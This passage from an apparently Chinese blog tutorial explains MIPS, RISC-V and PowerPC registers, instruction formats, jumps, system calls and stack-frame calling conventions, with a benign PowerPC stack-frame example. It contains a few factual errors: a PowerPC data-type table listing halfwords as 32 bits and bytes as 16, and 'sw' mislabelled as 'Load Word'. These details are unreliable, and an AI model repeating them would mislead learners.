style="text-align:left">$29</td><td style="text-align:left">$sp</td><td style="text-align:left">stack pointer，堆栈指针，指向堆栈的栈顶</td></tr><tr><td style="text-align:left">$30</td><td style="text-align:left">$fp</td><td style="text-align:left">frame pointer，保存栈指针</td></tr><tr><td style="text-align:left">$31</td><td style="text-align:left">$ra</td><td style="text-align:left">return address，返回地址</td></tr></tbody></table></div><h2 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h2><p>MISP的函数调用约定：<code>$a0~$a3</code> 用于函数前四个参数传参，多的参数用堆栈传参。<code>$v0~$v1</code>用于保存函数返回值。$fp寄存器可以理解为x86下的ebp</p><p><img src="https://toleleyjl.github.io/images/%E5%BC%82%E6%9E%84Pwn/pic10.png" alt=""></p><p>MIPS O32调用约定规定了执行跳转(调用)指令时，将返回值存储在ra寄存器。所占空间不大于4 byte的参数应该放在从 a0到 a3 的寄存器中，剩下的参数应该依次放到调用者 stack frame 的参数域中，并且在参数域中需要为前四个参数保留栈空间，因为被调用者使用到前四个参数时，是统一的将参数寄存器中的值放入保留的栈空间，再从保留的栈空间里面取值；如果被调用者需要使用 $s0~$s7 这些保留寄存器(saved register)，就必须先将这些保留寄存器的值保存在被调用者 stack frame 的保留寄存器域中，当被调用者返回时恢复这些寄存器值；当被调用者不是叶子函数时，即被调用者中存在对其它函数的调用，需要将 ra (return address) 寄存器 值保存到被调用者 stack frame 的返回值域中；被调用者所需要使用的局部变量，应保存在被调用者 stack frame 的本地变量域中。</p><p>进入一个函数时需要将当前栈指针向下移动 n 比特，这个大小为n比特的存储空间就是此函数的 stack frame 的存储区域。此后栈指针便不再移动，只能在函数返回时再将栈指针加上这个偏移量恢复栈现场。<strong>由于不能随便移动栈指针，所以寄存器压栈和出栈都必须指定偏移量。</strong></p><p>在 RISC 计算机中主要参与计算的是寄存器，saved registers 就是指在进入一个函数后，如果某个保存原函数信息的寄存器会在当前函数中被使用，就应该将此寄存器保存到堆栈上，当函数返回时恢复此寄存器值。而且由于 RISC 计算机大部分采用定长指令或者定变长指令，一般指令长度不会超过32个位。而现代计算机的内存地址范围已经扩展到 32 位，这样在一条指令里就不足以包含有效的内存地址，所以RISC计算机一般借助于一个返回地址寄存器 RA(return address) 来实现函数的返回。几乎在每个函数调用中都会使用到这个寄存器，所以在很多情况下 RA 寄存器会被保存在堆栈上以避免被后面的函数调用修改，当函数需要返回时，从堆栈上取回 RA 然后跳转。移动 SP 和保存寄存器的动作一般处在函数的开头；恢复这些寄存器状态的动作一般放在函数的最后。</p><h2 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h2><h2 id="指令格式"><a href="#指令格式" class="headerlink" title="指令格式"></a>指令格式</h2><p>MIPS指令长度为32位，其中指令位均为6位，其余的26位可以分为R型、I型、J型共3种类型。 </p><p>R型 Opcode(6) Rd(5) Rs(5) Rt(5) Shamt(5) Funct(6) </p><p>I型 Opcode(6) Rd(5) Rs(5) Immediate(16) </p><p>J型 Opcode(6) Address(26)</p><p>各字段含义如下：</p><ul><li>Opcode：指令基本操作，成为操作码；</li><li>Rs：第一个源操作数寄存器；</li><li>Rt：第二个源操作数寄存器；</li><li>Rd：存放操作结果的目的操作数；</li><li>Shamt：位移量；</li><li>Funct：函数，这个字段选择Opcode操作的某个特定变体。</li><li>PS：所以有些指令会被优化，比如li $v0,0x7777,实际上CPU会解析成ori $v0,$zero,0x7777或addi $v0,$zero,0x7777执行。</li></ul><h3 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h3><h4 id="内存与寄存器"><a href="#内存与寄存器" class="headerlink" title="内存与寄存器"></a>内存与寄存器</h4><ul><li><code>li(Load Immediate)：</code></li></ul><p>用于将一个立即数 存入一个寄存器</p><p><code>li $Rd, imm</code></p><ul><li><code>lui(Load Upper halfword Immediate)：</code></li></ul><p>读取一个16位立即数放入寄存器的高16位，低16位补0。如果加载一个32位立即数（DWORD）则需要lui和addi两条指令配合完成。因为作为32位定长指令没有足够的空间存储32位立即数，只能用16位代替。</p><p><code>lui $a1, 0x42 //将0x42放入$a1的高16位</code></p><ul><li><code>lw(Load Word)：</code></li></ul><p>用于从一个指定的地址加载一个word类型的值到寄存器中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lw $Rt, offset($Rs)</span><br><span class="line"></span><br><span class="line">lw $s0, 0($sp) //取堆栈地址偏移0内存word长度的值到$s0中，$s0 = MEM[$sp+0]</span><br></pre></td></tr></table></figure><ul><li><code>sw(Load Word)：</code></li></ul><p>用于将源寄存器中的值存入指定的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sw $Rt, offset($Rs)</span><br><span class="line"></span><br><span class="line">sw $a0, 0($sp) //将$a0寄存器中的一个word大小的值存入堆栈，且$sp自动抬栈</span><br></pre></td></tr></table></figure><h4 id="算术指令"><a href="#算术指令" class="headerlink" title="算术指令"></a>算术指令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add $t0, $t1, $t2 //$t0 = $t1 + $t2，带符号数相加</span><br><span class="line">sub $t0, $t1, $t2 //$t0 = $t1 - $t2，带符号数相减</span><br><span class="line">addi $t0, $t1, 5 //$t0 = $t1 + 5</span><br><span class="line">addu $t0, $t1, $t2 //$t0 = $t1 + $t2，无符号数相加</span><br><span class="line">subu $t0, $t1, $t2 //$t0 = $t1 - $t2，无符号数相减</span><br><span class="line">mult $t3, $t4 //(Hi, Lo) = $t3 * $t4</span><br><span class="line">div $t5, $t6 //$Lo = $t5 / $t6 $Lo为商的整数部分， $Hi为商的余数部分</span><br><span class="line">mfhi $t0 //$t0 = $Hi</span><br><span class="line">mflo $t1 //$t1 = $Lo</span><br></pre></td></tr></table></figure><h4 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h4><p><strong>系统调用号存放在$v0中,参数存放在$a0~$a3中</strong>（如果参数过多，会有另一套机制来处理）,系统调用的返回值通常放在$v0中,如果系统调用出错，则会在$a3中返回一个错误号,最终调用Syscall指令。</p><h4 id="内存寻址"><a href="#内存寻址" class="headerlink" title="内存寻址"></a>内存寻址</h4><ul><li>跳转指令(j)</li></ul><p>有限的32位指令长度对于大型程序的分支跳转支持确实是个难题。MIPS指令中最小的操作码域占6位，剩下的26位用于跳转目标的编址。由于所有指令在内存中都是4字节对齐的，因此最低的2个比特位是无需存储的，这样实际可供寻址范围为2^28=256MB。分支跳转地址被当做一个256MB的段内绝对地址，而非PC相对寻址。这对于地址范围超过256MB的跳转程序而言是无能为力的，所幸目前也很少遇到这么大的远程跳转需求。</p><ul><li>段外分支跳转 </li></ul><p>可以使用寄存器跳转指令实现，它可以跳转到任意（有效的）32位地址。</p><ul><li>条件分支跳转指令(b)</li></ul><p>编码域的后 16 位 broffset 是相对当前指令PC的有符号偏移量，由于指令是4字节对齐的，长度都为4个字节，因此可支持的跳转范围实际上是2^16 * 4（指令宽度）=2^18=256KB（相对PC的-128KB~+128KB）。如果确定跳转目标地址在分支指令前后的128KB范围内，编译器就可以编码只生成一条简单的条件分支指令。</p><h4 id="分支跳转指令"><a href="#分支跳转指令" class="headerlink" title="分支跳转指令"></a>分支跳转指令</h4><p>在MIPS中，分支跳转指令本身可通过比较两个寄存器中的值来决定是否跳转。要想实现与立即数比较的跳转，可以结合类跳转指令实现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">beq $Rs, $Rt, target //if ($Rs == $Rt): goto target</span><br><span class="line">blt $Rs, $Rt, target //if ($Rs &lt; $Rt): goto target </span><br><span class="line">ble $Rs, $Rt, target //if ($Rs &lt;= $Rt): goto target </span><br><span class="line">bgt $Rs, $Rt, target //if ($Rs &gt; $Rt): goto target </span><br><span class="line">bge $Rs, $Rt, target //if ($Rs &gt;= $Rt): goto target </span><br><span class="line">bne $Rs, $Rt, target //if ($Rs != $Rt): goto target</span><br></pre></td></tr></table></figure><h4 id="直接跳转指令"><a href="#直接跳转指令" class="headerlink" title="直接跳转指令"></a>直接跳转指令</h4><ul><li><p>j：该指令无条件跳转到一个绝对地址。实际上，j 指令跳转到的地址并不是直接指定32位的地址（所有 MIPS 指令都是 32 位长，不可能全部用于编址数据域，那样的指令是无效的，也许只有nop）：由于目的地址的最高4位无法在指令的编码中给出，32位地址的最高4位取值当前PC的最高4位。对于一般的程序而言，28位地址所支持的256MB跳转空间已经足够大了。</p><p>要实现更远程的跳转，必须使用 jr 指令跳转到指定寄存器中，该指令也用于需要计算合成跳转目标地址的情形。你可以使用 j 助记符后面紧跟一个寄存器表示寄存器跳转，不过一般不推荐这么做。</p></li><li><p>jal、jalr：这两条指令分别实现了直接和间接子程序调用。在跳转到指定地址实现子程序调用的同时，需要将返回地址（当前指令地址+8）保存到 ra（$31）寄存器中。为什么是当前指令地址加8呢？这是因为紧随跳转指令之后有一条立即执行的延迟槽指令（例如nop占位指令），加8刚好是延迟槽后面的那条有效指令。从子程序返回是通过寄存器跳转完成，通常调用 jr ra。</p><p>基于 PC 相对寻址的位置无关子程序调用通过 bal、bgezal 和 bltzal 指令完成。条件分支和链接指令即使在条件为假的情况下，也会将它们的返回地址保存到 ra 中，这在需要基于当前指令地址做计算的场合非常有用。</p></li><li><p>b：相对当前指令地址（PC）的无条件短距离跳转指令。</p></li><li><p>bal：基于当前指令地址（PC）的函数调用指令。</p></li></ul><h1 id="RISC-V"><a href="#RISC-V" class="headerlink" title="RISC-V"></a>RISC-V</h1><h2 id="寄存器-2"><a href="#寄存器-2" class="headerlink" title="寄存器"></a>寄存器</h2><p>RISC-V共32个通用寄存器,以及PC寄存器</p><div class="table-container"><table><thead><tr><th style="text-align:left">Register</th><th style="text-align:left">ABI Name</th><th style="text-align:left">Saver</th><th style="text-align:left">作用</th></tr></thead><tbody><tr><td style="text-align:left">x0</td><td style="text-align:left">zero</td><td style="text-align:left">—</td><td style="text-align:left">硬编码恒为0</td></tr><tr><td style="text-align:left">x1</td><td style="text-align:left">ra</td><td style="text-align:left">Caller</td><td style="text-align:left">函数调用的返回地址</td></tr><tr><td style="text-align:left">x2</td><td style="text-align:left">sp</td><td style="text-align:left">Callee</td><td style="text-align:left">堆栈指针</td></tr><tr><td style="text-align:left">x3</td><td style="text-align:left">gp</td><td style="text-align:left">—</td><td style="text-align:left">全局指针</td></tr><tr><td style="text-align:left">x4</td><td style="text-align:left">tp</td><td style="text-align:left">—</td><td style="text-align:left">线程指针</td></tr><tr><td style="text-align:left">x5-7</td><td style="text-align:left">t0-2</td><td style="text-align:left">Caller</td><td style="text-align:left">临时寄存器/</td></tr><tr><td style="text-align:left">x8</td><td style="text-align:left">s0/fp</td><td style="text-align:left">Callee</td><td style="text-align:left">保存寄存器/帧指针</td></tr><tr><td style="text-align:left">x9</td><td style="text-align:left">s1</td><td style="text-align:left">Callee</td><td style="text-align:left">保存寄存器</td></tr><tr><td style="text-align:left">x10-11</td><td style="text-align:left">a0-1</td><td style="text-align:left">Caller</td><td style="text-align:left">函数参数/返回值</td></tr><tr><td style="text-align:left">x12-17</td><td style="text-align:left">a2-7</td><td style="text-align:left">Caller</td><td style="text-align:left">函数参数</td></tr><tr><td style="text-align:left">x18-27</td><td style="text-align:left">s2-11</td><td style="text-align:left">Callee</td><td style="text-align:left">保存寄存器</td></tr><tr><td style="text-align:left">x28-31</td><td style="text-align:left">t3-6</td><td style="text-align:left">Caller</td><td style="text-align:left">临时寄存器</td></tr></tbody></table></div><p>函数调用过程中可以直接改写的寄存器叫<strong>临时寄存器(t0~t6)</strong>。在调用过程中不能直接改写的寄存器值得叫保存寄存器(s0~s11)**，函数调用过程中如果要使用s0~s11，需要由被调用函数进行保护，保证在函数调用前后内部值不变。</p><h2 id="栈帧与函数调用约定"><a href="#栈帧与函数调用约定" class="headerlink" title="栈帧与函数调用约定"></a>栈帧与函数调用约定</h2><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-12-12_231658.png" alt=""></p><p>寄存器与函数调用约定</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-12-12_232103.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-12-12_232509.png" alt=""></p><h2 id="跳转-1"><a href="#跳转-1" class="headerlink" title="跳转"></a>跳转</h2><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-12-12_232318.png" alt=""></p><h1 id="POWER-PC"><a href="#POWER-PC" class="headerlink" title="POWER-PC"></a>POWER-PC</h1><p>PowerPC（后称Performance Optimization With Enhanced RISC – Performance Computing，有时缩写为PPC）是一种精简指令集计算机(RISC)指令集架构(ISA)，由 1991 年苹果-IBM-摩托罗拉联盟创建，称为AIM。PowerPC 作为一种不断发展的指令集，自 2006 年起被命名为Power ISA，而旧名称作为基于Power Architecture的处理器 的某些实现的商标继续存在。</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>PowerPC支持的数据类型</p><div class="table-container"><table><thead><tr><th>名称</th><th>字长(bits)</th></tr></thead><tbody><tr><td>Quadwords</td><td>128</td></tr><tr><td>Doublewords</td><td>64</td></tr><tr><td>Halfwords</td><td>32</td></tr><tr><td>Words</td><td>16</td></tr><tr><td>Bytes</td><td>16</td></tr></tbody></table></div><h2 id="寄存器-3"><a href="#寄存器-3" class="headerlink" title="寄存器"></a>寄存器</h2><p>PowerPC中的寄存器有非常多，ABI规定的寄存器包括专用寄存器、易失性寄存器和非易失性寄存器。<br>易失性寄存器代表任何函数都可以自由对这些寄存器进行修改，并且不用恢复这些寄存器之前的值；而非易失性寄存器则代表函数可以使用这些寄存器，但需要在函数返回前将这些寄存器的值恢复。</p><ul><li>GPR寄存器</li></ul><p>General Purpose Rgister(GPR)，通用寄存器，从GPR0到GPR31共32个。<br>事实上在gdb中所见就是r0~r31，其中：<br>| 寄存器 | 用途 |<br>| - | - |<br>| r0 | 发生系统调用时对应的系统调用号 |<br>| r1 | 堆栈指针 |<br>| r2 | 内容表（toc）指针，IDA把这个寄存器反汇编标识为rtoc。系统调用时，它包含系统调用号 |<br>| r3 | 函数调用时的第一个参数和返回值 |<br>| r4-r10 | 函数调用时参数传递 |<br>| r11 | 用在指针的调用和当作一些语言的环境指针 |<br>| r12 | 它用在异常处理和glink（动态连接器）代码 |<br>| r13 | 保留作为系统线程ID |<br>| r14-r31 | 作为本地变量，非易失性(要保存) |</p><ul><li>FPR寄存器</li></ul><p>Floating-Point Register(FPR)，浮点寄存器，用于浮点运算，从FPR0-FPR31共32个。每个FPR寄存器都支持双精度浮点格式，在64位和32位处理器实现上，FPRs都是64位的。</p><ul><li>LR寄存器</li></ul><p>Link Register(LR)，链接寄存器，可以为条件转移链接寄存器指令提供转移目标地址，并在LK=1的转移指令之后保存返回地址。</p><p>LK即LINK bit，为0时不设置链接寄存器LR；为1时设置连接寄存器LR，转移指令后面的指令地址被放置在链接寄存器LR中</p><p>注意尽管两个最低有效位可以接受任何写入的值，但当LR被用作地址时，它们会被忽略。有些处理器可能会保存转移最近设置的LR值的堆栈。</p><ul><li>CR寄存器</li></ul><p>Condition Register(CR)，条件寄存器，它反映某些操作的结果，并提供一种测试（和转移）的机制</p><p>条件寄存器中的位被分组为8个4位字段，命名为CR字段0(CR0)，…，CR字段7(CR7)。CR字段可以通过一些指令进行设置，其中CR0可以是整数指令的隐式结果，CR1可以时浮点指令的隐式结果，指定的CR字段可以表示整数或浮点数比较指令的结果。</p><p><a href="https://imgtu.com/i/vZm4TU"><img src="https://storage.tttang.com/media/attachment/2022/08/08/9b520086-d2ee-44fa-99e1-0d94b00a200f.png" alt="vZm4TU.png"></a></p><p>CR0字段含义如下<br>| Bits | 描述 |<br>| - | - |<br>| 0 | Negative(LT) - 结果为负时设置该位，即小于 |<br>| 1 | Positive(GT) - 结果为正数（非零）时设置该位，即大于 |<br>| 2 | Zero(EQ) - 结果为0时设置该位，即等于 |<br>| 3 | Summary overflow(SO) - 这是XER[SO]指令完成时的最终状态的副本 |</p><p>需要注意当溢出发生时，CR0可能不能反应真实的结果</p><ul><li>CTR寄存器</li></ul><p>Count Register(CTR)，计数器，可以用来保存循环计数；还可以用来为转移条件计数寄存器指令提供转移目标地址。</p><ul><li>XER寄存器</li></ul><p>Fixed-Point Exception Register(XER)，特殊寄存器，是一个64位寄存器，用来记录溢出和进位标志</p><div class="table-container"><table><thead><tr><th>Bits</th><th>描述</th></tr></thead><tbody><tr><td>0:31</td><td>保留</td></tr><tr><td>32</td><td>Summary Overflow(SO):每当指令(除mtspr)设置溢出位时，SO位被设置为1。一旦设置，SO位会保持设置知道被一个mtspr指令(指定XER)或一个mcrxr指令清除。它不会被compare指令修改，也不会被其他不能溢出的指令(除对XER的mtspr、mcrxr)改变</td></tr><tr><td>33</td><td>Overflow(OV)：执行指令时发生溢出设置。OV位不会被compare指令改变，也不会被其他不能溢出的指令(除对XER的mtspr、mcrxr)改变</td></tr><tr><td>34</td><td>Carry(CA)：在执行某些指令时，进位设置如下，加进位，减进位，加扩展，减扩展类型的指令，如果有M位的进位则设位1，否则设为0。执行右移代数指令时如果有任何1位移出了一个负操作数，设置其为1，否则设为0。CA位不会被compare指令改变，也不会被其他不能进位的指令（除代数右移、对XER的mtspr、mcrxr）改变</td></tr><tr><td>35:56</td><td>保留</td></tr><tr><td>57:63</td><td>该字段指定“加载字符串索引”或“存储字符串索引”指令传输的字节数</td></tr></tbody></table></div><ul><li>FPSCR寄存器</li></ul><p>Floating-Point Status and Control Register(FPSCR)，浮点状态和控制寄存器，控制浮点异常的处理，并记录浮点操作产生的状态，其中0:23位是状态位，24:31位是控制位。浮点异常包括浮点数溢出异常、下溢异常、除零异常、无效操作异常等</p><ul><li>MSR</li></ul><p>机器状态寄存器，MSR定义处理器的状态，用来配置微处理器的设定。</p><p>寄存器r1、r14-r31是非易失性的，这意味着它们的值在函数调用过程保持不变。寄存器r2也算非易失性，但是只有在调用函数在调用后必须恢复它的值时才被处理。</p><p>寄存器r0、r3-r12和特殊寄存器lr、ctr、xer、fpscr是易失性的，它们的值在函数调用过程中会发生变化。此外寄存器r0、r2、r11和r12可能会被交叉模块调用改变，所以函数在调用的时候不能采用它们的值。</p><p>条件代码寄存器字段cr0、cr1、cr5、cr6和cr7是易失性的。cr2、cr3和cr4是非易失性的，函数如果要改变它们必须保存并恢复这些字段。</p><div class="table-container"><table><thead><tr><th style="text-align:left">序号</th><th style="text-align:left">寄存器</th><th style="text-align:left">功能</th></tr></thead><tbody><tr><td style="text-align:left">1</td><td style="text-align:left">GPR0-GPR31（共32个寄存器）</td><td style="text-align:left">整数运算和寻址通用寄存器.在ABI规范中，GPR1用于堆栈指针，GPR3-GPR4用于函数返回值，GPR3-GPR10用于参数传递</td></tr><tr><td style="text-align:left">2</td><td style="text-align:left">FPR0-FPR31（共32个寄存器）</td><td style="text-align:left">用于浮点运算。PPC32和PPC64的浮点数都是64位</td></tr><tr><td style="text-align:left">3</td><td style="text-align:left">LR</td><td style="text-align:left">连接寄存器，记录转跳地址，常用于记录子程序返回的地址。</td></tr><tr><td style="text-align:left">4</td><td style="text-align:left">CR</td><td style="text-align:left">条件寄存器。</td></tr><tr><td style="text-align:left">5</td><td style="text-align:left">XER</td><td style="text-align:left">特殊寄存器，记录溢出和进位标志，作为CR的补充</td></tr><tr><td style="text-align:left">6</td><td style="text-align:left">CTR</td><td style="text-align:left">计数器，用途相当于ECX</td></tr><tr><td style="text-align:left">7</td><td style="text-align:left">FPSCR</td><td style="text-align:left">浮点状态寄存器，用于浮点运算类型的异常记录等，可设置浮点异常捕获掩码</td></tr></tbody></table></div><h2 id="常用指令-1"><a href="#常用指令-1" class="headerlink" title="常用指令"></a>常用指令</h2><h3 id="数据传送"><a href="#数据传送" class="headerlink" title="数据传送"></a>数据传送</h3><h4 id="加载数据"><a href="#加载数据" class="headerlink" title="加载数据"></a>加载数据</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lbz RT,D(RA)</span><br><span class="line">lhz RT,D(RA)</span><br><span class="line">lha RT,D(RA)</span><br><span class="line">lwz RT,D(RA)</span><br><span class="line">lwa RT,DS(RA)</span><br><span class="line">ld RT,DS(RA)</span><br></pre></td></tr></table></figure><p>上述指令均表示以<code>(EA)=(RA|0)+D/DS</code>为有效地址加载字节到<code>RT</code>中，以偏移地址寻址。<code>b</code>，<code>h</code>，<code>w</code>，<code>d</code>分别代表字节、半字、字、双字，指加载的位数。<br><code>z</code>表示其他位清零，<code>a</code>表示其他位将被加载的数据的位0复制填充。</p><p>指令最后加一个<code>x</code>表示寄存器寻址，例如<code>lbzx RT,RA,RB</code>表示以<code>(RA|0)+(RB)</code>为有效地址加载字节到<code>RT</code>中。</p><h4 id="存储数据"><a href="#存储数据" class="headerlink" title="存储数据"></a>存储数据</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">stb RS,D(RA)</span><br><span class="line">sth RS,D(RA)</span><br><span class="line">stw RS,D(RA)</span><br><span class="line">std RS,DS(RA)</span><br></pre></td></tr></table></figure><p>都是类似加载指令的，同理上述指令均以偏移地址寻址，将<code>RS</code>的值存储到<code>(RA|0)+D/DS</code>地址中。如果最后加一个<code>x</code>则表示寄存器寻址。</p><h3 id="跳转-2"><a href="#跳转-2" class="headerlink" title="跳转"></a>跳转</h3><h4 id="控制转移"><a href="#控制转移" class="headerlink" title="控制转移"></a>控制转移</h4><p>无条件转移</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b target_addr (AA = 0 LK = 0)</span><br><span class="line">ba target_addr (AA = 1 LK = 0)</span><br><span class="line">bl target_addr (AA = 0 LK = 1)</span><br><span class="line">bla target_addr (AA = 1 LK = 1)</span><br></pre></td></tr></table></figure><p>target_addr指定转移目标地址，如果<code>AA=0</code>，那么转移目标地址是<code>LI||0b00</code>经符号符号拓展后加上指令地址；如果<code>AA=1</code>，那么转移目标地址为<code>LI||0b00</code>经符号拓展后的值。<br>如果<code>LK=1</code>，则转移指令的下一条指令的有效地址会被放置到链接寄存器<code>LR</code>中。<br><code>B-Form</code>指令长度32位(0-31)，<code>AA</code>是30位，<code>LK</code>是31位</p><h4 id="条件转移"><a href="#条件转移" class="headerlink" title="条件转移"></a>条件转移</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bc BO,BI,target_addr (AA = 0 LK = 0)</span><br><span class="line">bca BO,BI,target_addr (AA = 1 LK = 0)</span><br><span class="line">bcl BO,BI,target_addr (AA = 0 LK = 1)</span><br><span class="line">bcla BO,BI,target_addr (AA = 1 LK = 1)</span><br></pre></td></tr></table></figure><p><code>BI</code>字段表示作为转移条件的CR位，<code>BO</code>字段操作码对应具体如何进行转移</p><p>一些常见的转移条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lt &lt;=&gt; less than</span><br><span class="line">le &lt;=&gt; less than or equal</span><br><span class="line">eq &lt;=&gt; equal</span><br><span class="line">ge &lt;=&gt; greater than or equal</span><br><span class="line">gt &lt;=&gt; greater than</span><br><span class="line">nl &lt;=&gt; not less than</span><br></pre></td></tr></table></figure><h3 id="系统调用-1"><a href="#系统调用-1" class="headerlink" title="系统调用"></a>系统调用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc</span><br></pre></td></tr></table></figure><p><code>r0</code>作为系统调用号</p><h2 id="栈帧与函数调用约定-1"><a href="#栈帧与函数调用约定-1" class="headerlink" title="栈帧与函数调用约定"></a>栈帧与函数调用约定</h2><p>栈的概念在PPC等CPU中，不是由CPU实现的，而是由编译器维护的。通常情况下，在PPC中栈顶指针寄存器使用r1，栈底指针寄存器使用r11或r31。或者r11为栈顶，其他为栈底。根据不同的编译选项和编译器环境，其使用方式都有不同，但各个编译器的共识为r1是帧栈指针，其他寄存器都可根据他为准灵活使用。</p><p>栈帧在函数中，通常用于存储局部变量、编译器产生的临时变量等。由于PPC和ARM等CPU在寄存器较多，所以函数的形参和实参大多数情况下会使用寄存器，参数较多的情况下使用栈。</p><p>PowerPC体系结构中栈的增长方向同样是从高地址到低地址，堆的增长方式是从低地址到高地址，当两者相遇时就会产生溢出。</p><p>堆栈帧的格式如下：</p><p><a href="https://imgtu.com/i/vZtd8P"><img src="https://storage.tttang.com/media/attachment/2022/08/08/9f67f039-fc74-4fcd-8b7b-b743fbea3b1f.png" alt="vZtd8P.png"></a></p><p>下面从一个例子分析PPC中栈帧的变化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// powerpc-linux-gnu-gcc -static -g -o t t.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">test</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ok,n1,n2,n3,n4,n5,n6,n7,n8,n9;</span><br><span class="line">    ok=n1=n2=n3=n4=n5=n6=n7=n8=n9=n;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d%d%d%d%d%d%d%d%d%d%d&quot;</span>,ok,n,n1,n2,n3,n4,n5,n6,n7,n8,n9);</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> n;</span><br><span class="line">    n=test(n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在进入函数的时候会先执行</p><p><a href="https://imgtu.com/i/vmxmnJ"><img src="https://storage.tttang.com/media/attachment/2022/08/08/bf1a4e7f-7c76-4a2a-be61-21df55dcb065.png" alt="vmxmnJ.png"></a></p><p><code>r1</code>就类似栈顶指针，第一条指令中，<code>stwu</code>最后的<code>u</code>表示update，指令中有效地址<code>EA=r1+back_chain</code>，该指令首先会将<code>r1</code>的值存放到<code>EA</code>中，接着会把有效地址<code>EA</code>存到<code>r1</code>里。<code>back_chain</code>对应新栈帧大小，是一个负值，此处为0x60，所以这里实际上就是开辟了一块新的栈帧，让<code>r1</code>指向新栈顶，同时在新栈顶处存储了上一个栈帧的栈顶，从而构成一个类似链表的东西，在之后帮助恢复栈帧。</p><p><code>mflr r0</code>，把<code>lr</code>寄存器的值保存到<code>r0</code>中。接着<code>stw</code>将<code>r0</code>保存到栈上，从而在栈上保存了<code>lr</code>返回地址的值。指令中对栈变量的索引使用的是<code>0x60+sender_lr(r1)</code>，<code>r1</code>已经指向新栈帧的栈顶，所以这里是通过栈顶指针索引栈上的局部变量，栈帧空间大小即0x60。</p><p>下一条<code>stw</code>指令将<code>r31</code>存储到栈上，然后执行<code>mr</code>把<code>r1</code>的值赋给<code>r31</code>。</p><p>接下来就是函数中的赋值和调用<code>printf</code>的操作了</p><p><a href="https://imgtu.com/i/vmxu7R"><img src="https://storage.tttang.com/media/attachment/2022/08/08/c8ff5d04-6e39-4d8a-817c-b3638a398a05.png" alt="vmxu7R.png"></a></p><p>由于<code>test</code>函数传入了一个参数n，是通过<code>r3</code>传递的。所以在之后看到首先把<code>r3</code>存到了栈上，接着不断连续调用<code>lwz</code>和<code>stw</code>指令，以<code>r9</code>为中间量，并通过<code>r31</code>索引，对栈上局部变量进行赋值。</p><p>接下来就是为函数调用布置参数了，这里由于我们使用的参数很多，会同时使用寄存器和栈变量进行传参。<strong>ppc中没有<code>push</code>、<code>pop</code>这样的指令</strong>，栈帧空间是提前设置好的，这里指令做的就是把参数从右往左把多出来的4个参数依次在栈上从高地址往低地址放置，第9个参数与栈顶位置中间还会留下一个字长的空间，用来存放下一个栈帧的返回地址；剩下的8个参数按照从右往左依次放入<code>r3</code>~<code>r10</code>中，指定执行时是从<code>r10</code>开始存放的。<code>crclr</code>是用来调整条件寄存器<code>CR</code>的。</p><p>最后就是恢复函数栈帧</p><p><a href="https://imgtu.com/i/vmxJje"><img 